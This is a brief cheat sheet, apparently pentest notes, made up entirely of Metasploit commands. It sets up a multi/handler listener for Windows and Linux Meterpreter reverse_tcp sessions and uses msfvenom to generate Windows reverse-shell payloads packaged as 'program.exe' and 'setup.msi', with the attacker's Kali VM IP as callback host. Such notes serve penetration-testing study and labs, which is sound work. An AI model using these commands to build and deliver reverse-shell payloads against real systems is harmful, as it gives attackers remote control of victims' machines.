
```bash
msfconsole
use multi/handler
set payload [payload]
[windows/meterpreter/reverse_tcp]
[linux/x64/meterpreter/reverse_tcp]
set lhost [IP]
set lport [PORT]
background
sessions -l
session - i [Number]
```

# MSFVENOM

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=Kali VM IP Address] lport=4444 -f exe -o program.exe

msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] lport=4444 -f msi -o setup.msi
```

